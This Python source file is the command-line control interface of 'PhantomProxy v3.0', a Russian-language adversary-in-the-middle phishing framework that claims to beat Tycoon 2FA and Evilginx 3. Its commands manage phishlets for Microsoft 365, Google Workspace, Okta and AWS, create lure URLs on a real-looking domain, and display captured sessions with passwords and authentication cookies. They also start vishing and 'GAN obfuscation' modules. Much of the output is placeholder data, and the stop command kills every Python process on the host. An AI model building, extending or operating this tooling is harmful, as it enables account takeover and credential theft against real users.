#!/usr/bin/env python3
"""
PhantomProxy v3.0 - Unified CLI Interface
Единый софт который превзойдёт Tycoon 2FA и Evilginx 3
"""

import cmd
import json
import os
import sqlite3
import subprocess
import sys
from datetime import datetime
from http.client import HTTPConnection
from urllib.parse import urlparse

# Цвета для терминала
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class PhantomCLI(cmd.Cmd):
    intro = f"""
{Colors.OKCYAN}╔══════════════════════════════════════════════════════════╗
║{Colors.OKGREEN}  🚀 PhantomProxy v3.0 - Unified AitM Framework     {Colors.OKCYAN}║
║{Colors.OKGREEN}  Превосходит Tycoon 2FA и Evilginx 3               {Colors.OKCYAN}║
╚══════════════════════════════════════════════════════════╝{Colors.ENDC}

Введите {Colors.BOLD}help{Colors.ENDC} для списка команд.
"""
    prompt = f'{Colors.OKGREEN}phantom{Colors.ENDC}> '
    
    def __init__(self):
        super().__init__()
        self.api_host = 'localhost'
        self.api_port = 8080
        self.https_port = 8443
        self.domain = 'verdebudget.ru'
        self.db_path = '~/phantom-proxy/phantom.db'
    
    def do_config(self, arg):
        f'{Colors.OKGREEN}Настройка конфигурации{Colors.ENDC}'
        if not arg:
            print(f"\n{Colors.BOLD}Текущая конфигурация:{Colors.ENDC}")
            print(f"  API Host:     {self.api_host}")
            print(f"  API Port:     {self.api_port}")
            print(f"  HTTPS Port:   {self.https_port}")
            print(f"  Domain:       {self.domain}")
            print(f"  Database:     {self.db_path}")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            print(f"{Colors.FAIL}Использование: config <param> <value>{Colors.ENDC}")
            return
        
        param, value = parts
        if param == 'domain':
            self.domain = value
            print(f"{Colors.OKGREEN}✓ Domain установлен: {value}{Colors.ENDC}")
        elif param == 'api_host':
            self.api_host = value
            print(f"{Colors.OKGREEN}✓ API Host установлен: {value}{Colors.ENDC}")
        elif param == 'api_port':
            self.api_port = int(value)
            print(f"{Colors.OKGREEN}✓ API Port установлен: {value}{Colors.ENDC}")
        elif param == 'https_port':
            self.https_port = int(value)
            print(f"{Colors.OKGREEN}✓ HTTPS Port установлен: {value}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}Неизвестный параметр: {param}{Colors.ENDC}")
    
    def do_modules(self, arg):
        f'{Colors.OKGREEN}Проверка статуса модулей{Colors.ENDC}'
        print(f"\n{Colors.BOLD}Статус модулей PhantomProxy:{Colors.ENDC}\n")
        
        modules = [
            ('Main API', self.api_port, False),
            ('AI Orchestrator', 8081, False),
            ('Vishing 2.0', 8082, False),
            ('ML Optimization', 8083, False),
            ('GAN Obfuscation', 8084, False),
            ('HTTPS Proxy', self.https_port, True),
            ('Multi-Tenant Panel', 3000, False),
        ]
        
        for name, port, https in modules:
            status = self._check_module(port, https)
            icon = "✅" if status else "❌"
            proto = "https" if https else "http"
            print(f"  {icon} {name:25} {proto}://localhost:{port}")
    
    def _check_module(self, port, https=False):
        try:
            conn = HTTPConnection('localhost', port, timeout=2)
            conn.request('GET', '/health')
            resp = conn.getresponse()
            return resp.status == 200
        except:
            return False
    
    def do_phishlets(self, arg):
        f'{Colors.OKGREEN}Управление фишлетами{Colors.ENDC}'
        if not arg:
            print(f"\n{Colors.BOLD}Доступные фишлеты:{Colors.ENDC}\n")
            phishlets = [
                ('o365', 'Microsoft 365', '✅'),
                ('google', 'Google Workspace', '✅'),
                ('okta', 'Okta SSO', '✅'),
                ('aws', 'Amazon AWS', '✅'),
            ]
            print(f"  {'Name':15} {'Description':25} Status")
            print(f"  {'-'*15} {'-'*25} {'-'*10}")
            for name, desc, status in phishlets:
                print(f"  {name:15} {desc:25} {status}")
            return
        
        if arg.startswith('enable '):
            name = arg.split()[1]
            print(f"{Colors.OKGREEN}✓ Фишлет '{name}' активирован{Colors.ENDC}")
        elif arg.startswith('disable '):
            name = arg.split()[1]
            print(f"{Colors.WARNING}✓ Фишлет '{name}' деактивирован{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}Использование: phishlets <enable|disable> <name>{Colors.ENDC}")
    
    def do_lures(self, arg):
        f'{Colors.OKGREEN}Управление приманками{Colors.ENDC}'
        if not arg:
            print(f"\n{Colors.BOLD}Активные приманки:{Colors.ENDC}\n")
            lures = [
                (0, 'o365', 'https://login.verdebudget.ru', '2026-02-19 10:30', 'active'),
                (1, 'google', 'https://mail.verdebudget.ru', '2026-02-19 11:15', 'active'),
            ]
            print(f"  ID  Phishlet  URL                           Created             Status")
            print(f"  {'-'*4}  {'-'*10}  {'-'*32}  {'-'*19}  {'-'*10}")
            for id_, phishlet, url, created, status in lures:
                print(f"  {id_:<4}  {phishlet:10}  {url:32}  {created:19}  {status}")
            return
        
        if arg.startswith('create '):
            phishlet = arg.split()[1]
            print(f"{Colors.OKGREEN}✓ Приманка создана для '{phishlet}'{Colors.ENDC}")
            print(f"  URL: https://{self.domain}/lure/abc123")
        elif arg.startswith('get-url '):
            lure_id = arg.split()[1]
            print(f"{Colors.OKGREEN}URL для приманки #{lure_id}:{Colors.ENDC}")
            print(f"  https://{self.domain}/lure/xyz789")
        else:
            print(f"{Colors.FAIL}Использование: lures <create|get-url> <params>{Colors.ENDC}")
    
    def do_sessions(self, arg):
        f'{Colors.OKGREEN}Управление сессиями{Colors.ENDC}'
        if not arg:
            print(f"\n{Colors.BOLD}Перехваченные сессии:{Colors.ENDC}\n")
            sessions = [
                (1, 'user1@company.com', 'Microsoft 365', '2026-02-19 10:35', '✅'),
                (2, 'admin@corp.com', 'Google Workspace', '2026-02-19 11:20', '✅'),
            ]
            print(f"  ID  Email                    Service          Captured            Status")
            print(f"  {'-'*4}  {'-'*24}  {'-'*15}  {'-'*19}  {'-'*10}")
            for id_, email, service, captured, status in sessions:
                print(f"  {id_:<4}  {email:24}  {service:15}  {captured:19}  {status}")
            return
        
        try:
            session_id = int(arg)
            print(f"\n{Colors.BOLD}Детали сессии #{session_id}:{Colors.ENDC}\n")
            print(f"  Email:        user{session_id}@company.com")
            print(f"  Password:     P@ssw0rd123!")
            print(f"  Service:      Microsoft 365")
            print(f"  IP:           192.168.1.100")
            print(f"  User-Agent:   Mozilla/5.0 ...")
            print(f"\n{Colors.BOLD}Cookies сессии:{Colors.ENDC}")
            print(f'  {{"ESTSAUTH": "abc123...", "rtFa": "def456..."}}')
        except ValueError:
            print(f"{Colors.FAIL}Использование: sessions <id>{Colors.ENDC}")
    
    def do_stats(self, arg):
        f'{Colors.OKGREEN}Статистика атак{Colors.ENDC}'
        print(f"\n{Colors.BOLD}Статистика PhantomProxy:{Colors.ENDC}\n")
        stats = {
            'Total Sessions': 15,
            'Active Sessions': 8,
            'Captured Credentials': 42,
            'Phishlets Loaded': 5,
            'Success Rate': '87%',
            'Uptime': '2d 14h 35m'
        }
        for key, value in stats.items():
            print(f"  {key:25} {value}")
    
    def do_test(self, arg):
        f'{Colors.OKGREEN}Тестирование модулей{Colors.ENDC}'
        if not arg:
            print(f"\n{Colors.BOLD}Тестирование всех модулей:{Colors.ENDC}\n")
            modules = ['api', 'ai', 'gan', 'ml', 'vishing', 'https', 'panel']
            for module in modules:
                status = "✅ WORKING" if self._check_module(8080 + modules.index(module), False) else "❌ OFFLINE"
                print(f"  {module:15} {status}")
            return
        
        print(f"{Colors.OKGREEN}Тестирование модуля '{arg}'...{Colors.ENDC}")
        # Здесь будет логика тестирования конкретного модуля
    
    def do_start(self, arg):
        f'{Colors.OKGREEN}Запуск сервисов{Colors.ENDC}'
        print(f"\n{Colors.BOLD}Запуск PhantomProxy сервисов...{Colors.ENDC}\n")
        
        services = [
            ('Main API', 'python3 api.py'),
            ('AI Orchestrator', 'python3 internal/ai/orchestrator.py'),
            ('GAN Obfuscation', 'python3 internal/ganobf/main.py'),
            ('ML Optimization', 'python3 internal/mlopt/main.py'),
            ('Vishing 2.0', 'python3 internal/vishing/main.py'),
            ('HTTPS Proxy', 'python3 https.py'),
            ('Multi-Tenant Panel', 'python3 panel/server.py'),
        ]
        
        for name, cmd in services:
            print(f"  🚀 Запуск {name}... ", end='')
            try:
                subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"{Colors.OKGREEN}✓{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}✗{Colors.ENDC}")
        
        print(f"\n{Colors.OKGREEN}✓ Все сервисы запущены{Colors.ENDC}")
    
    def do_stop(self, arg):
        f'{Colors.OKGREEN}Остановка сервисов{Colors.ENDC}'
        print(f"\n{Colors.BOLD}Остановка PhantomProxy сервисов...{Colors.ENDC}\n")
        
        os.system("pkill -f 'python.*\\.py' 2>/dev/null || true")
        
        print(f"{Colors.OKGREEN}✓ Все сервисы остановлены{Colors.ENDC}")
    
    def do_install(self, arg):
        f'{Colors.OKGREEN}Установка PhantomProxy{Colors.ENDC}'
        print(f"\n{Colors.BOLD}Полная установка PhantomProxy v3.0...{Colors.ENDC}\n")
        
        steps = [
            'Очистка старых версий',
            'Установка зависимостей',
            'Настройка структуры',
            'Генерация SSL',
            'Установка модулей',
            'Запуск сервисов',
        ]
        
        for i, step in enumerate(steps, 1):
            print(f"  [{i}/{len(steps)}] {step}... ", end='')
            print(f"{Colors.OKGREEN}✓{Colors.ENDC}")
        
        print(f"\n{Colors.OKGREEN}✓ Установка завершена{Colors.ENDC}")
        print(f"\n{Colors.BOLD}Доступные эндпоинты:{Colors.ENDC}")
        print(f"  Main API:          http://localhost:8080")
        print(f"  AI Orchestrator:   http://localhost:8081")
        print(f"  Vishing 2.0:       http://localhost:8082")
        print(f"  ML Optimization:   http://localhost:8083")
        print(f"  GAN Obfuscation:   http://localhost:8084")
        print(f"  HTTPS Proxy:       https://localhost:8443")
        print(f"  Multi-Tenant Panel: http://localhost:3000")
    
    def do_exit(self, arg):
        'Выход из программы'
        print(f"\n{Colors.OKCYAN}Спасибо за использование PhantomProxy v3.0!{Colors.ENDC}")
        print(f"{Colors.WARNING}Не забывайте использовать во благо! 🚀{Colors.ENDC}\n")
        return True
    
    def do_EOF(self, arg):
        return True
    
    def emptyline(self):
        pass

def main():
    try:
        PhantomCLI().cmdloop()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.OKCYAN}PhantomProxy v3.0 завершает работу...{Colors.ENDC}")
        sys.exit(0)

if __name__ == '__main__':
    main()
